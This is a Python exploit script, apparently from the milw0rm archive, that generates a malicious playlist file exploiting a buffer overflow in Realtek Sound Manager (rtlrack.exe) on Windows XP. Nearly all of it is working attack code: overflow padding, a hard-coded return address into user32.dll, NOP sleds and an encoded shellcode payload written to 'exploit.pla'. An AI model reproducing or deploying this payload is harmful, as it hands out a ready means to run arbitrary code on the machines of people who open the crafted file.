#usage: exploit.py

print "--------------------------------------------------------------------------"
print " Realtek Sound Manager (rtlrack.exe v. 1.15.0.0) PlayList Buffer Overflow\n"
print " url: http://www.realtek.com.tw/\n"
print " download: ftp://152.104.238.19/pc/audio/AP_A406.exe"
print "           ftp://202.65.194.212/pc/audio/AP_A406.exe"
print "           ftp://66.104.77.130/pc/audio/AP_A406.exe\n"
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://www.shinnai.net\n"
print " Tested on: Windows XP Pro SP3 Ita\n"
print " Greetings to:"
print " str0ke for being a friend as well as a great man\n"
print " In memory of rgod"
print "--------------------------------------------------------------------------"

buff = "\x41" * 220

EIP = "\xEB\xBA\x3F\x7E" #call ESP from user32.dll

nop = "\x90" * 12

shellcode = (
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
    "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
    "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
    "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
    "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
    "\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x47"
    "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x54\x4a\x41\x4b\x38"
    "\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x48"
    "\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"
    "\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
    "\x46\x4f\x4b\x43\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x58"
    "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x30\x4b\x44"
    "\x4b\x48\x4f\x35\x4e\x41\x41\x30\x4b\x4e\x4b\x38\x4e\x51\x4b\x38"
    "\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"
    "\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"
    "\x4e\x30\x4b\x38\x42\x34\x4e\x50\x4b\x58\x42\x47\x4e\x41\x4d\x4a"
    "\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x48\x42\x4b"
    "\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x55\x41\x33"
    "\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
    "\x42\x55\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x35\x4a\x36\x4a\x59"
    "\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x56"
    "\x4e\x46\x43\x56\x50\x32\x45\x46\x4a\x37\x45\x36\x42\x50\x5a"
    )

egg = buff + EIP + nop + shellcode + nop

try:
    out_file = open("exploit.pla",'w')
    out_file.write(egg)
    out_file.close()
    raw_input("\nFILE CREATED!\n\nPress any key to exit...")
except:
    print "Something goes wrong..."

# milw0rm.com [2008-12-16]
